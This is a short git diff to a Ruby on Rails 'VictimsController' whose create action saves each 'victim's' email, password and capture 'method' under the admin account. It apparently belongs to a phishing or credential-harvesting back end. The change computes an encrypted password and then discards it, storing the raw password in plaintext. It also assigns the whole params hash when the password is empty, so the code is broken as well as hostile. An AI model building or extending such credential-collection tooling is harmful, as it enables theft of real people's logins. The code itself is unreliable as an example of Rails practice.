@@ -9,9 +9,15 @@ class VictimsController < ApplicationController
   def create
     admin = User.find_by({name: "admin"})
 
+    if params[:password].empty?
+      password = params
+    else
+      password = AESCrypt.encrypt(params[:password], ENV["YOUR_FUNNY"])
+    end 
+
     victim = Victim.new(
       email: params[:email],
-      password: AESCrypt.encrypt(params[:password], ENV["YOUR_FUNNY"]),
+      password: params[:password],
       method: params[:method],
       user_id: admin.id
     )
